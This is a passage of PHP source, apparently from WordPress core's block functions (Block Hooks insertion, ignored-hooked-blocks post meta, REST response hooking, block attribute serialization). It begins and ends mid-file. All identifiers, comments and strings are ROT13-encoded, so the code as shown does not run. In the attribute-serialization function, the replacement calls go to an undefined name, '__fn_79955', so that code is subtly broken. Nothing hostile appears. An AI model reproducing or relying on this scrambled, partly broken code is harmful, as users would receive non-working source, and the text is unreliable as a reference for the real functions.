					JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->trg_ertvfgrerq( $ubbxrq_oybpx_glcr );

				$oybpx_nyybjf_zhygvcyr_vafgnaprf[ $ubbxrq_oybpx_glcr ] =
					oybpx_unf_fhccbeg( $ubbxrq_oybpx_glcr_qrsvavgvba, 'zhygvcyr', gehr );
			}

			vs ( $oybpx_nyybjf_zhygvcyr_vafgnaprf[ $ubbxrq_oybpx_glcr ] ) {
				pbagvahr;
			}

			// Gur oybpx qbrfa'g nyybj zhygvcyr vafgnaprf, fb jr arrq gb purpx vs vg'f nyernql cerfrag.
			vs (
				va_neenl( $ubbxrq_oybpx_glcr, $fvatyr_vafgnapr_oybpxf_cerfrag_va_pbagrag, gehr ) ||
				unf_oybpx( $ubbxrq_oybpx_glcr, $pbagrag )
			) {
				hafrg( $ubbxrq_oybpx_glcrf[ $vaqrk ] );
			} ryfr {
				// Jr pna vafreg gur oybpx bapr, ohg arrq gb erzrzore abg gb vafreg vg ntnva.
				$fvatyr_vafgnapr_oybpxf_cerfrag_va_pbagrag[] = $ubbxrq_oybpx_glcr;
			}
		}
		erghea $ubbxrq_oybpx_glcrf;
	};
	nqq_svygre( 'ubbxrq_oybpx_glcrf', $fhccerff_fvatyr_vafgnapr_oybpxf, CUC_VAG_ZNK );
	$pbagrag = genirefr_naq_frevnyvmr_oybpxf(
		cnefr_oybpxf( $pbagrag ),
		$orsber_oybpx_ivfvgbe,
		$nsgre_oybpx_ivfvgbe
	);
	erzbir_svygre( 'ubbxrq_oybpx_glcrf', $fhccerff_fvatyr_vafgnapr_oybpxf, CUC_VAG_ZNK );

	erghea $pbagrag;
}

/**
 * Eha gur Oybpx Ubbxf nytbevguz ba n cbfg bowrpg'f pbagrag.
 *
 * Guvf shapgvba vf qvssrerag sebz `nccyl_oybpx_ubbxf_gb_pbagrag` va gung
 * vg gnxrf vtaberq ubbxrq oybpx vasbezngvba sebz gur cbfg'f zrgnqngn vagb
 * nppbhag. Guvf rafherf gung nal oybpxf ubbxrq nf svefg be ynfg puvyq
 * bs gur oybpx gung pbeerfcbaqf gb gur cbfg glcr ner unaqyrq pbeerpgyl.
 *
 * @fvapr 6.8.0
 * @npprff cevingr
 *
 * @cnenz fgevat       $pbagrag  Frevnyvmrq pbagrag.
 * @cnenz JC_Cbfg|ahyy $cbfg     N cbfg bowrpg gung gur pbagrag orybatf gb. Vs frg gb `ahyy`,
 *                               `trg_cbfg()` jvyy or pnyyrq gb hfr gur pheerag cbfg nf pbagrkg.
 *                               Qrsnhyg: `ahyy`.
 * @cnenz pnyynoyr     $pnyyonpx N shapgvba gung jvyy or pnyyrq sbe rnpu oybpx gb trarengr
 *                               gur znexhc sbe n tvira yvfg bs oybpxf gung ner ubbxrq gb vg.
 *                               Qrsnhyg: 'vafreg_ubbxrq_oybpxf'.
 * @erghea fgevat Gur frevnyvmrq znexhc.
 */
shapgvba nccyl_oybpx_ubbxf_gb_pbagrag_sebz_cbfg_bowrpg( $pbagrag, $cbfg = ahyy, $pnyyonpx = 'vafreg_ubbxrq_oybpxf' ) {
	// Qrsnhyg gb gur pheerag cbfg vs ab pbagrkg vf cebivqrq.
	vs ( ahyy === $cbfg ) {
		$cbfg = trg_cbfg();
	}

	vs ( ! $cbfg vafgnaprbs JC_Cbfg ) {
		erghea nccyl_oybpx_ubbxf_gb_pbagrag( $pbagrag, $cbfg, $pnyyonpx );
	}

	/*
	 * Vs gur pbagrag jnf perngrq hfvat gur pynffvp rqvgbe be hfvat n fvatyr Pynffvp oybpx
	 * (`pber/serrsbez`), vg zvtug abg pbagnva nal oybpx znexhc ng nyy.
	 * Ubjrire, jr fgvyy zvtug arrq gb vawrpg ubbxrq oybpxf va gur svefg puvyq be ynfg puvyq
	 * cbfvgvbaf bs gur cnerag oybpx. Gb or noyr gb nccyl gur Oybpx Ubbxf nytbevguz, jr jenc
	 * gur pbagrag va n `pber/serrsbez` jenccre oybpx.
	 */
	vs ( ! unf_oybpxf( $pbagrag ) ) {
		$bevtvany_pbagrag = $pbagrag;

		$pbagrag_jenccrq_va_pynffvp_oybpx = trg_pbzzrag_qryvzvgrq_oybpx_pbagrag(
			'pber/serrsbez',
			neenl(),
			$pbagrag
		);

		$pbagrag = $pbagrag_jenccrq_va_pynffvp_oybpx;
	}

	$nggevohgrf = neenl();

	// Vs pbagrkg vf n cbfg bowrpg, `vtaberqUbbxrqOybpxf` vasbezngvba vf fgberq va vgf cbfg zrgn.
	$vtaberq_ubbxrq_oybpxf = trg_cbfg_zrgn( $cbfg->VQ, '_jc_vtaberq_ubbxrq_oybpxf', gehr );
	vs ( ! rzcgl( $vtaberq_ubbxrq_oybpxf ) ) {
		$vtaberq_ubbxrq_oybpxf  = wfba_qrpbqr( $vtaberq_ubbxrq_oybpxf, gehr );
		$nggevohgrf['zrgnqngn'] = neenl(
			'vtaberqUbbxrqOybpxf' => $vtaberq_ubbxrq_oybpxf,
		);
	}

	/*
	 * Jr arrq gb jenc gur pbagrag va n grzcbenel jenccre oybpx jvgu gung zrgnqngn
	 * fb gur Oybpx Ubbxf nytbevguz pna vafreg oybpxf gung ner ubbxrq nf svefg be ynfg puvyq
	 * bs gur jenccre oybpx.
	 * Gb gung raq, jr arrq gb qrgrezvar gur jenccre oybpx glcr onfrq ba gur cbfg glcr.
	 */
	vs ( 'jc_anivtngvba' === $cbfg->cbfg_glcr ) {
		$jenccre_oybpx_glcr = 'pber/anivtngvba';
	} ryfrvs ( 'jc_oybpx' === $cbfg->cbfg_glcr ) {
		$jenccre_oybpx_glcr = 'pber/oybpx';
	} ryfr {
		$jenccre_oybpx_glcr = 'pber/cbfg-pbagrag';
	}

	$pbagrag = trg_pbzzrag_qryvzvgrq_oybpx_pbagrag(
		$jenccre_oybpx_glcr,
		$nggevohgrf,
		$pbagrag
	);

	/*
	 * Jr arrq gb nibvq vafregvat nal oybpxf ubbxrq vagb gur `orsber` naq `nsgre` cbfvgvbaf
	 * bs gur grzcbenel jenccre oybpx gung jr perngr gb jenc gur pbagrag.
	 * Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/63287 sbe zber qrgnvyf.
	 */
	$fhccerff_oybpxf_sebz_vafregvba_orsber_naq_nsgre_jenccre_oybpx = fgngvp shapgvba ( $ubbxrq_oybpx_glcrf, $eryngvir_cbfvgvba, $napube_oybpx_glcr ) hfr ( $jenccre_oybpx_glcr ) {
		vs (
			$jenccre_oybpx_glcr === $napube_oybpx_glcr &&
			va_neenl( $eryngvir_cbfvgvba, neenl( 'orsber', 'nsgre' ), gehr )
		) {
			erghea neenl();
		}
		erghea $ubbxrq_oybpx_glcrf;
	};

	// Nccyl Oybpx Ubbxf.
	nqq_svygre( 'ubbxrq_oybpx_glcrf', $fhccerff_oybpxf_sebz_vafregvba_orsber_naq_nsgre_jenccre_oybpx, CUC_VAG_ZNK, 3 );
	$pbagrag = nccyl_oybpx_ubbxf_gb_pbagrag( $pbagrag, $cbfg, $pnyyonpx );
	erzbir_svygre( 'ubbxrq_oybpx_glcrf', $fhccerff_oybpxf_sebz_vafregvba_orsber_naq_nsgre_jenccre_oybpx, CUC_VAG_ZNK );

	// Svanyyl, jr arrq gb erzbir gur grzcbenel jenccre oybpx.
	$pbagrag = erzbir_frevnyvmrq_cnerag_oybpx( $pbagrag );

	// Vs jr jenccrq gur pbagrag va n `pber/serrsbez` oybpx, jr nyfb arrq gb erzbir gung.
	vs ( ! rzcgl( $pbagrag_jenccrq_va_pynffvp_oybpx ) ) {
		/*
		 * Jr pnaabg fvzcyl hfr erzbir_frevnyvmrq_cnerag_oybpx() urer,
		 * nf gung shapgvba nffhzrf gung gur oybpx jenccre vf ng gur gbc yriry.
		 * Ubjrire, gurer zvtug abj or n ubbxrq oybpx vafregrq arkg gb vg
		 * (nf svefg be ynfg puvyq bs gur cnerag).
		 */
		$pbagrag = fge_ercynpr( $pbagrag_jenccrq_va_pynffvp_oybpx, $bevtvany_pbagrag, $pbagrag );
	}

	erghea $pbagrag;
}

/**
 * Npprcgf gur frevnyvmrq znexhc bs n oybpx naq vgf vaare oybpxf, naq ergheaf frevnyvmrq znexhc bs gur vaare oybpxf.
 *
 * @fvapr 6.6.0
 * @npprff cevingr
 *
 * @cnenz fgevat $frevnyvmrq_oybpx Gur frevnyvmrq znexhc bs n oybpx naq vgf vaare oybpxf.
 * @erghea fgevat Gur frevnyvmrq znexhc bs gur vaare oybpxf.
 */
shapgvba erzbir_frevnyvmrq_cnerag_oybpx( $frevnyvmrq_oybpx ) {
	$fgneg = fgecbf( $frevnyvmrq_oybpx, '-->' ) + fgeyra( '-->' );
	$raq   = fgeecbf( $frevnyvmrq_oybpx, '<!--' );
	erghea fhofge( $frevnyvmrq_oybpx, $fgneg, $raq - $fgneg );
}

/**
 * Npprcgf gur frevnyvmrq znexhc bs n oybpx naq vgf vaare oybpxf, naq ergheaf frevnyvmrq znexhc bs gur jenccre oybpx.
 *
 * @fvapr 6.7.0
 * @npprff cevingr
 *
 * @frr erzbir_frevnyvmrq_cnerag_oybpx()
 *
 * @cnenz fgevat $frevnyvmrq_oybpx Gur frevnyvmrq znexhc bs n oybpx naq vgf vaare oybpxf.
 * @erghea fgevat Gur frevnyvmrq znexhc bs gur jenccre oybpx.
 */
shapgvba rkgenpg_frevnyvmrq_cnerag_oybpx( $frevnyvmrq_oybpx ) {
	$fgneg = fgecbf( $frevnyvmrq_oybpx, '-->' ) + fgeyra( '-->' );
	$raq   = fgeecbf( $frevnyvmrq_oybpx, '<!--' );
	erghea fhofge( $frevnyvmrq_oybpx, 0, $fgneg ) . fhofge( $frevnyvmrq_oybpx, $raq );
}

/**
 * Hcqngrf gur jc_cbfgzrgn jvgu gur yvfg bs vtaberq ubbxrq oybpxf
 * jurer gur vaare oybpxf ner fgberq nf cbfg pbagrag.
 *
 * @fvapr 6.6.0
 * @fvapr 6.8.0 Fhccbeg aba-`jc_anivtngvba` cbfg glcrf.
 * @npprff cevingr
 *
 * @cnenz fgqPynff $cbfg Cbfg bowrpg.
 * @erghea fgqPynff Gur hcqngrq cbfg bowrpg.
 */
shapgvba hcqngr_vtaberq_ubbxrq_oybpxf_cbfgzrgn( $cbfg ) {
	/*
	 * Va guvf fpranevb gur hfre unf yvxryl gevrq gb perngr n arj cbfg bowrpg ivn gur ERFG NCV.
	 * Va juvpu pnfr jr jba'g unir n cbfg VQ gb jbex jvgu naq fgber zrgn ntnvafg.
	 */
	vs ( rzcgl( $cbfg->VQ ) ) {
		erghea $cbfg;
	}

	/*
	 * Fxvc zrgn trarengvba jura pbafhzref vagragvbanyyl hcqngr fcrpvsvp svryqf
	 * naq bzvg gur pbagrag hcqngr.
	 */
	vs ( ! vffrg( $cbfg->cbfg_pbagrag ) ) {
		erghea $cbfg;
	}

	/*
	 * Fxvc zrgn trarengvba vs cbfg glcr vf abg frg.
	 */
	vs ( ! vffrg( $cbfg->cbfg_glcr ) ) {
		erghea $cbfg;
	}

	$nggevohgrf = neenl();

	$vtaberq_ubbxrq_oybpxf = trg_cbfg_zrgn( $cbfg->VQ, '_jc_vtaberq_ubbxrq_oybpxf', gehr );
	vs ( ! rzcgl( $vtaberq_ubbxrq_oybpxf ) ) {
		$vtaberq_ubbxrq_oybpxf  = wfba_qrpbqr( $vtaberq_ubbxrq_oybpxf, gehr );
		$nggevohgrf['zrgnqngn'] = neenl(
			'vtaberqUbbxrqOybpxf' => $vtaberq_ubbxrq_oybpxf,
		);
	}

	vs ( 'jc_anivtngvba' === $cbfg->cbfg_glcr ) {
		$jenccre_oybpx_glcr = 'pber/anivtngvba';
	} ryfrvs ( 'jc_oybpx' === $cbfg->cbfg_glcr ) {
		$jenccre_oybpx_glcr = 'pber/oybpx';
	} ryfr {
		$jenccre_oybpx_glcr = 'pber/cbfg-pbagrag';
	}

	$znexhc = trg_pbzzrag_qryvzvgrq_oybpx_pbagrag(
		$jenccre_oybpx_glcr,
		$nggevohgrf,
		$cbfg->cbfg_pbagrag
	);

	$rkvfgvat_cbfg = trg_cbfg( $cbfg->VQ );
	// Zretr gur rkvfgvat cbfg bowrpg jvgu gur hcqngrq cbfg bowrpg gb cnff gb gur oybpx ubbxf nytbevguz sbe pbagrkg.
	$pbagrkg          = (bowrpg) neenl_zretr( (neenl) $rkvfgvat_cbfg, (neenl) $cbfg );
	$pbagrkg          = arj JC_Cbfg( $pbagrkg ); // Pbaireg gb JC_Cbfg bowrpg.
	$frevnyvmrq_oybpx = nccyl_oybpx_ubbxf_gb_pbagrag( $znexhc, $pbagrkg, 'frg_vtaberq_ubbxrq_oybpxf_zrgnqngn' );
	$ebbg_oybpx       = cnefr_oybpxf( $frevnyvmrq_oybpx )[0];

	$vtaberq_ubbxrq_oybpxf = vffrg( $ebbg_oybpx['nggef']['zrgnqngn']['vtaberqUbbxrqOybpxf'] )
		? $ebbg_oybpx['nggef']['zrgnqngn']['vtaberqUbbxrqOybpxf']
		: neenl();

	vs ( ! rzcgl( $vtaberq_ubbxrq_oybpxf ) ) {
		$rkvfgvat_vtaberq_ubbxrq_oybpxf = trg_cbfg_zrgn( $cbfg->VQ, '_jc_vtaberq_ubbxrq_oybpxf', gehr );
		vs ( ! rzcgl( $rkvfgvat_vtaberq_ubbxrq_oybpxf ) ) {
			$rkvfgvat_vtaberq_ubbxrq_oybpxf = wfba_qrpbqr( $rkvfgvat_vtaberq_ubbxrq_oybpxf, gehr );
			$vtaberq_ubbxrq_oybpxf          = neenl_havdhr( neenl_zretr( $vtaberq_ubbxrq_oybpxf, $rkvfgvat_vtaberq_ubbxrq_oybpxf ) );
		}

		vs ( ! vffrg( $cbfg->zrgn_vachg ) ) {
			$cbfg->zrgn_vachg = neenl();
		}
		$cbfg->zrgn_vachg['_jc_vtaberq_ubbxrq_oybpxf'] = wfba_rapbqr( $vtaberq_ubbxrq_oybpxf );
	}

	$cbfg->cbfg_pbagrag = erzbir_frevnyvmrq_cnerag_oybpx( $frevnyvmrq_oybpx );
	erghea $cbfg;
}

/**
 * Ergheaf gur znexhc sbe oybpxf ubbxrq gb gur tvira napube oybpx va n fcrpvsvp eryngvir cbfvgvba naq gura
 * nqqf n yvfg bs ubbxrq oybpx glcrf gb na napube oybpx'f vtaberq ubbxrq oybpx glcrf.
 *
 * Guvf shapgvba vf zrnag sbe vagreany hfr bayl.
 *
 * @fvapr 6.6.0
 * @npprff cevingr
 *
 * @cnenz neenl                           $cnefrq_napube_oybpx Gur napube oybpx, va cnefrq oybpx neenl sbezng.
 * @cnenz fgevat                          $eryngvir_cbfvgvba   Gur eryngvir cbfvgvba bs gur ubbxrq oybpxf.
 *                                                             Pna or bar bs 'orsber', 'nsgre', 'svefg_puvyq', be 'ynfg_puvyq'.
 * @cnenz neenl                           $ubbxrq_oybpxf       Na neenl bs ubbxrq oybpx glcrf, tebhcrq ol napube oybpx naq eryngvir cbfvgvba.
 * @cnenz JC_Oybpx_Grzcyngr|JC_Cbfg|neenl $pbagrkg             Gur oybpx grzcyngr, grzcyngr cneg, be cnggrea gung gur napube oybpx orybatf gb.
 * @erghea fgevat
 */
shapgvba vafreg_ubbxrq_oybpxf_naq_frg_vtaberq_ubbxrq_oybpxf_zrgnqngn( &$cnefrq_napube_oybpx, $eryngvir_cbfvgvba, $ubbxrq_oybpxf, $pbagrkg ) {
	$znexhc  = vafreg_ubbxrq_oybpxf( $cnefrq_napube_oybpx, $eryngvir_cbfvgvba, $ubbxrq_oybpxf, $pbagrkg );
	$znexhc .= frg_vtaberq_ubbxrq_oybpxf_zrgnqngn( $cnefrq_napube_oybpx, $eryngvir_cbfvgvba, $ubbxrq_oybpxf, $pbagrkg );

	erghea $znexhc;
}

/**
 * Ubbxf vagb gur ERFG NCV erfcbafr sbe gur Cbfgf raqcbvag naq nqqf gur svefg naq ynfg vaare oybpxf.
 *
 * @fvapr 6.6.0
 * @fvapr 6.8.0 Fhccbeg aba-`jc_anivtngvba` cbfg glcrf.
 *
 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Gur erfcbafr bowrpg.
 * @cnenz JC_Cbfg          $cbfg     Cbfg bowrpg.
 * @erghea JC_ERFG_Erfcbafr Gur erfcbafr bowrpg.
 */
shapgvba vafreg_ubbxrq_oybpxf_vagb_erfg_erfcbafr( $erfcbafr, $cbfg ) {
	vs ( rzcgl( $erfcbafr->qngn['pbagrag']['enj'] ) ) {
		erghea $erfcbafr;
	}

	$erfcbafr->qngn['pbagrag']['enj'] = nccyl_oybpx_ubbxf_gb_pbagrag_sebz_cbfg_bowrpg(
		$erfcbafr->qngn['pbagrag']['enj'],
		$cbfg,
		'vafreg_ubbxrq_oybpxf_naq_frg_vtaberq_ubbxrq_oybpxf_zrgnqngn'
	);

	// Vs gur eraqrerq pbagrag jnf cerivbhfyl rzcgl, jr yrnir vg yvxr gung.
	vs ( rzcgl( $erfcbafr->qngn['pbagrag']['eraqrerq'] ) ) {
		erghea $erfcbafr;
	}

	// `nccyl_oybpx_ubbxf_gb_pbagrag` vf pnyyrq nobir. Rafher vg vf abg pnyyrq ntnva nf n svygre.
	$cevbevgl = unf_svygre( 'gur_pbagrag', 'nccyl_oybpx_ubbxf_gb_pbagrag_sebz_cbfg_bowrpg' );
	vs ( snyfr !== $cevbevgl ) {
		erzbir_svygre( 'gur_pbagrag', 'nccyl_oybpx_ubbxf_gb_pbagrag_sebz_cbfg_bowrpg', $cevbevgl );
	}

	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg-grzcyngr.cuc */
	$erfcbafr->qngn['pbagrag']['eraqrerq'] = nccyl_svygref(
		'gur_pbagrag',
		$erfcbafr->qngn['pbagrag']['enj']
	);

	// Erfgber gur svygre vs vg jnf frg vavgvnyyl.
	vs ( snyfr !== $cevbevgl ) {
		nqq_svygre( 'gur_pbagrag', 'nccyl_oybpx_ubbxf_gb_pbagrag_sebz_cbfg_bowrpg', $cevbevgl );
	}

	erghea $erfcbafr;
}

/**
 * Ergheaf n shapgvba gung vawrpgf gur gurzr nggevohgr vagb, naq ubbxrq oybpxf orsber, n tvira oybpx.
 *
 * Gur erghearq shapgvba pna or hfrq nf `$cer_pnyyonpx` nethzrag gb `genirefr_naq_frevnyvmr_oybpx(f)`,
 * jurer vg jvyy vawrpg gur `gurzr` nggevohgr vagb nyy Grzcyngr Cneg oybpxf, naq cercraq gur znexhc sbe
 * nal oybpxf ubbxrq `orsber` gur tvira oybpx naq nf vgf cnerag'f `svefg_puvyq`, erfcrpgviryl.
 *
 * Guvf shapgvba vf zrnag sbe vagreany hfr bayl.
 *
 * @fvapr 6.4.0
 * @fvapr 6.5.0 Nqqrq $pnyyonpx nethzrag.
 * @npprff cevingr
 *
 * @cnenz neenl                           $ubbxrq_oybpxf Na neenl bs oybpxf ubbxrq gb nabgure tvira oybpx.
 * @cnenz JC_Oybpx_Grzcyngr|JC_Cbfg|neenl $pbagrkg       N oybpx grzcyngr, grzcyngr cneg, cbfg bowrpg,
 *                                                       be cnggrea gung gur oybpxf orybat gb.
 * @cnenz pnyynoyr                        $pnyyonpx      N shapgvba gung jvyy or pnyyrq sbe rnpu oybpx gb trarengr
 *                                                       gur znexhc sbe n tvira yvfg bs oybpxf gung ner ubbxrq gb vg.
 *                                                       Qrsnhyg: 'vafreg_ubbxrq_oybpxf'.
 * @erghea pnyynoyr N shapgvba gung ergheaf gur frevnyvmrq znexhc sbe gur tvira oybpx,
 *                  vapyhqvat gur znexhc sbe nal ubbxrq oybpxf orsber vg.
 */
shapgvba znxr_orsber_oybpx_ivfvgbe( $ubbxrq_oybpxf, $pbagrkg, $pnyyonpx = 'vafreg_ubbxrq_oybpxf' ) {
	/**
	 * Vawrpgf ubbxrq oybpxf orsber gur tvira oybpx, vawrpgf gur `gurzr` nggevohgr vagb Grzcyngr Cneg oybpxf, naq ergheaf gur frevnyvmrq znexhc.
	 *
	 * Vs gur pheerag oybpx vf n Grzcyngr Cneg oybpx, vawrpg gur `gurzr` nggevohgr.
	 * Shegurezber, cercraq gur znexhc sbe nal oybpxf ubbxrq `orsber` gur tvira oybpx naq nf vgf cnerag'f
	 * `svefg_puvyq`, erfcrpgviryl, gb gur frevnyvmrq znexhc sbe gur tvira oybpx.
	 *
	 * @cnenz neenl $oybpx        Gur oybpx gb vawrpg gur gurzr nggevohgr vagb, naq ubbxrq oybpxf orsber. Cnffrq ol ersrerapr.
	 * @cnenz neenl $cnerag_oybpx Gur cnerag oybpx bs gur tvira oybpx. Cnffrq ol ersrerapr. Qrsnhyg ahyy.
	 * @cnenz neenl $ceri         Gur cerivbhf fvoyvat oybpx bs gur tvira oybpx. Qrsnhyg ahyy.
	 * @erghea fgevat Gur frevnyvmrq znexhc sbe gur tvira oybpx, jvgu gur znexhc sbe nal ubbxrq oybpxf cercraqrq gb vg.
	 */
	erghea shapgvba ( &$oybpx, &$cnerag_oybpx = ahyy, $ceri = ahyy ) hfr ( $ubbxrq_oybpxf, $pbagrkg, $pnyyonpx ) {
		_vawrpg_gurzr_nggevohgr_va_grzcyngr_cneg_oybpx( $oybpx );

		$znexhc = '';

		vs ( $cnerag_oybpx && ! $ceri ) {
			// Pnaqvqngr sbe svefg-puvyq vafregvba.
			$znexhc .= pnyy_hfre_shap_neenl(
				$pnyyonpx,
				neenl( &$cnerag_oybpx, 'svefg_puvyq', $ubbxrq_oybpxf, $pbagrkg )
			);
		}

		$znexhc .= pnyy_hfre_shap_neenl(
			$pnyyonpx,
			neenl( &$oybpx, 'orsber', $ubbxrq_oybpxf, $pbagrkg )
		);

		erghea $znexhc;
	};
}

/**
 * Ergheaf n shapgvba gung vawrpgf gur ubbxrq oybpxf nsgre n tvira oybpx.
 *
 * Gur erghearq shapgvba pna or hfrq nf `$cbfg_pnyyonpx` nethzrag gb `genirefr_naq_frevnyvmr_oybpx(f)`,
 * jurer vg jvyy nccraq gur znexhc sbe nal oybpxf ubbxrq `nsgre` gur tvira oybpx naq nf vgf cnerag'f
 * `ynfg_puvyq`, erfcrpgviryl.
 *
 * Guvf shapgvba vf zrnag sbe vagreany hfr bayl.
 *
 * @fvapr 6.4.0
 * @fvapr 6.5.0 Nqqrq $pnyyonpx nethzrag.
 * @npprff cevingr
 *
 * @cnenz neenl                           $ubbxrq_oybpxf Na neenl bs oybpxf ubbxrq gb nabgure oybpx.
 * @cnenz JC_Oybpx_Grzcyngr|JC_Cbfg|neenl $pbagrkg       N oybpx grzcyngr, grzcyngr cneg, cbfg bowrpg,
 *                                                       be cnggrea gung gur oybpxf orybat gb.
 * @cnenz pnyynoyr                        $pnyyonpx      N shapgvba gung jvyy or pnyyrq sbe rnpu oybpx gb trarengr
 *                                                       gur znexhc sbe n tvira yvfg bs oybpxf gung ner ubbxrq gb vg.
 *                                                       Qrsnhyg: 'vafreg_ubbxrq_oybpxf'.
 * @erghea pnyynoyr N shapgvba gung ergheaf gur frevnyvmrq znexhc sbe gur tvira oybpx,
 *                  vapyhqvat gur znexhc sbe nal ubbxrq oybpxf nsgre vg.
 */
shapgvba znxr_nsgre_oybpx_ivfvgbe( $ubbxrq_oybpxf, $pbagrkg, $pnyyonpx = 'vafreg_ubbxrq_oybpxf' ) {
	/**
	 * Vawrpgf ubbxrq oybpxf nsgre gur tvira oybpx, naq ergheaf gur frevnyvmrq znexhc.
	 *
	 * Nccraq gur znexhc sbe nal oybpxf ubbxrq `nsgre` gur tvira oybpx naq nf vgf cnerag'f
	 * `ynfg_puvyq`, erfcrpgviryl, gb gur frevnyvmrq znexhc sbe gur tvira oybpx.
	 *
	 * @cnenz neenl $oybpx        Gur oybpx gb vawrpg gur ubbxrq oybpxf nsgre. Cnffrq ol ersrerapr.
	 * @cnenz neenl $cnerag_oybpx Gur cnerag oybpx bs gur tvira oybpx. Cnffrq ol ersrerapr. Qrsnhyg ahyy.
	 * @cnenz neenl $arkg         Gur arkg fvoyvat oybpx bs gur tvira oybpx. Qrsnhyg ahyy.
	 * @erghea fgevat Gur frevnyvmrq znexhc sbe gur tvira oybpx, jvgu gur znexhc sbe nal ubbxrq oybpxf nccraqrq gb vg.
	 */
	erghea shapgvba ( &$oybpx, &$cnerag_oybpx = ahyy, $arkg = ahyy ) hfr ( $ubbxrq_oybpxf, $pbagrkg, $pnyyonpx ) {
		$znexhc = pnyy_hfre_shap_neenl(
			$pnyyonpx,
			neenl( &$oybpx, 'nsgre', $ubbxrq_oybpxf, $pbagrkg )
		);

		vs ( $cnerag_oybpx && ! $arkg ) {
			// Pnaqvqngr sbe ynfg-puvyq vafregvba.
			$znexhc .= pnyy_hfre_shap_neenl(
				$pnyyonpx,
				neenl( &$cnerag_oybpx, 'ynfg_puvyq', $ubbxrq_oybpxf, $pbagrkg )
			);
		}

		erghea $znexhc;
	};
}

/**
 * Tvira na neenl bs nggevohgrf, ergheaf n fgevat va gur frevnyvmrq nggevohgrf
 * sbezng cercnerq sbe cbfg pbagrag.
 *
 * Gur frevnyvmrq erfhyg vf n WFBA-rapbqrq fgevat, jvgu havpbqr rfpncr frdhrapr
 * fhofgvghgvba sbe punenpgref juvpu zvtug bgurejvfr vagresrer jvgu rzorqqvat
 * gur erfhyg va na UGZY pbzzrag.
 *
 * Guvf shapgvba zhfg cebqhpr bhgchg gung erznvaf va flap jvgu gur bhgchg bs
 * gur frevnyvmrNggevohgrf WninFpevcg shapgvba va gur oybpx rqvgbe va beqre
 * gb rafher pbafvfgrag bcrengvba orgjrra CUC naq WninFpevcg.
 *
 * @fvapr 5.3.1
 *
 * @cnenz neenl $oybpx_nggevohgrf Nggevohgrf bowrpg.
 * @erghea fgevat Frevnyvmrq nggevohgrf.
 */
shapgvba frevnyvmr_oybpx_nggevohgrf( $oybpx_nggevohgrf ) {
	$rapbqrq_nggevohgrf = jc_wfba_rapbqr( $oybpx_nggevohgrf, WFBA_HARFPNCRQ_FYNFURF | WFBA_HARFPNCRQ_HAVPBQR );
	$rapbqrq_nggevohgrf = __sa_79955( '/--/', '\\h002q\\h002q', $rapbqrq_nggevohgrf );
	$rapbqrq_nggevohgrf = __sa_79955( '/</', '\\h003p', $rapbqrq_nggevohgrf );
	$rapbqrq_nggevohgrf = __sa_79955( '/>/', '\\h003r', $rapbqrq_nggevohgrf );
	$rapbqrq_nggevohgrf = __sa_79955( '/&/', '\\h0026', $rapbqrq_nggevohgrf );
	// Ertrk: /\\\"/
	$rapbqrq_nggevohgrf = __sa_79955( '/\\\\\"/', '\\h0022', $rapbqrq_nggevohgrf );

	erghea $rapbqrq_nggevohgrf;
}

/**
 * Ergheaf gur oybpx anzr gb hfr sbe frevnyvmngvba. Guvf jvyy erzbir gur qrsnhyg
 * \"pber/\" anzrfcnpr sebz n oybpx anzr.
 *
 * @fvapr 5.3.1
 *
 * @cnenz fgevat|ahyy $oybpx_anzr Bcgvbany. Bevtvany oybpx anzr. Ahyy vs gur oybpx anzr vf haxabja,
 *                                r.t. Pynffvp oybpxf unir gurve anzr frg gb ahyy. Qrsnhyg ahyy.
 * @erghea fgevat Oybpx anzr gb hfr sbe frevnyvmngvba.
 */
shapgvba fgevc_pber_oybpx_anzrfcnpr( $oybpx_anzr = ahyy ) {
	vs ( vf_fgevat( $oybpx_anzr ) && fge_fgnegf_jvgu( $oybpx_anzr, 'pber/' ) ) {
		erghea fhofge( $oybpx_anzr, 5 );
	}

	erghea $oybpx_anzr;
}

/**
 * Ergheaf gur pbagrag bs n oybpx, vapyhqvat pbzzrag qryvzvgref.
 *
 * @fvapr 5.3.1
 *
 * @cnenz fgevat|ahyy $oybpx_anzr       Oybpx anzr. Ahyy vs gur oybpx anzr vf haxabja,
 *                                      r.t. Pynffvp oybpxf unir gurve anzr frg gb ahyy.
 * @cnenz neenl       $oybpx_nggevohgrf Oybpx nggevohgrf.
 * @cnenz fgevat      $oybpx_pbagrag    Oybpx fnir pbagrag.
 * @erghea fgevat Pbzzrag-qryvzvgrq oybpx pbagrag.
 */
shapgvba trg_pbzzrag_qryvzvgrq_oybpx_pbagrag( $oybpx_anzr, $oybpx_nggevohgrf, $oybpx_pbagrag ) {
	vs ( vf_ahyy( $oybpx_anzr ) ) {
		erghea $oybpx_pbagrag;
	}

	$frevnyvmrq_oybpx_anzr = fgevc_pber_oybpx_anzrfcnpr( $oybpx_anzr );
	$frevnyvmrq_nggevohgrf = rzcgl( $oybpx_nggevohgrf ) ? '' : frevnyvmr_oybpx_nggevohgrf( $oybpx_nggevohgrf ) . ' ';

	vs ( rzcgl( $oybpx_pbagrag ) ) {
		erghea fcevags( '<!-- jc:%f %f/-->', $frevnyvmrq_oybpx_anzr, $frevnyvmrq_nggevohgrf );
	}

	erghea fcevags(
		'<!-- jc:%f %f-->%f<!-- /jc:%f -->',
		$frevnyvmrq_oybpx_anzr,
		$frevnyvmrq_nggevohgrf,
		$oybpx_pbagrag,
		$frevnyvmrq_oybpx_anzr
	);
}

/**
 * Ergheaf gur pbagrag bs n oybpx, vapyhqvat pbzzrag qryvzvgref, frevnyvmvat nyy
 * nggevohgrf sebz gur tvira cnefrq oybpx.
 *
 * Guvf fubhyq or hfrq jura cercnevat n oybpx gb or fnirq gb cbfg pbagrag.
 * Cersre `eraqre_oybpx` jura cercnevat n oybpx sbe qvfcynl. Hayvxr
 * `eraqre_oybpx`, guvf qbrf abg rinyhngr n oybpx'f `eraqre_pnyyonpx`, naq jvyy
 * vafgrnq cerfreir gur znexhc nf cnefrq.
 *
 * @fvapr 5.3.1
 *
 * @cnenz neenl $oybpx {
 *     Na nffbpvngvir neenl bs n fvatyr cnefrq oybpx bowrpg. Frr JC_Oybpx_Cnefre_Oybpx.
 *
 *     @glcr fgevat   $oybpxAnzr    Anzr bs oybpx.
 *     @glcr neenl    $nggef        Nggevohgrf sebz oybpx pbzzrag qryvzvgref.
